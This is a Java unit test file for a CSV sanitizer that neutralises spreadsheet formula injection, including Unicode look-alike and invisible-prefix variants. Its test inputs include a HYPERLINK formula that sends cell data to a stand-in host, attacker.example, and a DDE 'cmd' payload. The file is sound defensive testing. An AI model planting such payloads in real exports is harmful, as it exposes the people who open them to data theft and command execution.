package com.educore.common.text;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Arrays;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

class CsvFormulaInjectionTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "=1+1",
            "=HYPERLINK(\"http://attacker.example/?\"&A1,\"click\")",
            "+1+cmd|' /C calc'!A0",
            "-2+3",
            "@SUM(A1:A2)",
            "\t=1+1",
            "\r=1+1",
            "\tplain",
            "\rplain",
            "  =1+1",
            " \n=1+1",
            " @SUM(1)",
            "   -1",
            "＝1+1",            // fullwidth =
            "＋1",              // fullwidth +
            "－1",              // fullwidth -
            "＠SUM(A1)",        // fullwidth @
            "﹦HYPERLINK(1)",   // small-form =
            "−5",              // MINUS SIGN
            " =1+1",           // FIGURE SPACE
            " =1+1",           // NARROW NO-BREAK SPACE
            "　+1",             // IDEOGRAPHIC SPACE
            "  @x",       // EM SPACE, THIN SPACE
            "​=1",             // ZERO WIDTH SPACE
            "﻿=1"})            // BYTE ORDER MARK
    void cellsThatASpreadsheetWouldEvaluateArePrefixedWithAQuote(String value) {
        String safe = CsvSanitizer.neutralise(value);

        assertThat(safe).isEqualTo("'" + value);
    }

    @ParameterizedTest
    @ValueSource(strings = {"Ayşe", "2601005", "192.168.1.10", "a=b", "x+y", "mail@example.org", "Course - 1",
            "O'Neil", " plain with leading space", ""})
    void ordinaryCellsAreUnchanged(String value) {
        assertThat(CsvSanitizer.neutralise(value)).isEqualTo(value);
    }

    @Test
    void nullBecomesAnEmptyCell() {
        assertThat(CsvSanitizer.neutralise(null)).isEmpty();
        assertThat(CsvSanitizer.cell(null)).isEmpty();
    }

    @Test
    void cellsWithSeparatorsQuotesOrLineBreaksAreQuotedAfterNeutralising() {
        assertThat(CsvSanitizer.cell("Smith, John")).isEqualTo("\"Smith, John\"");
        assertThat(CsvSanitizer.cell("say \"hi\"")).isEqualTo("\"say \"\"hi\"\"\"");
        assertThat(CsvSanitizer.cell("line1\nline2")).isEqualTo("\"line1\nline2\"");
        assertThat(CsvSanitizer.cell("=1,2")).isEqualTo("\"'=1,2\"");
        assertThat(CsvSanitizer.cell("a;b")).isEqualTo("\"a;b\"");
    }

    @Test
    void aRowCannotSmuggleAFormulaIntoAnyColumn() {
        String row = CsvSanitizer.row(List.of("Ali", "=cmd|' /C calc'!A0", "@x", "2601005"));

        assertThat(row).isEqualTo("Ali,'=cmd|' /C calc'!A0,'@x,2601005");
        assertThat(splitCells(row)).noneMatch(cell -> !cell.isEmpty() && "=+-@\t\r".indexOf(cell.charAt(0)) >= 0);
    }

    private static List<String> splitCells(String row) {
        return Arrays.asList(row.split(","));
    }
}
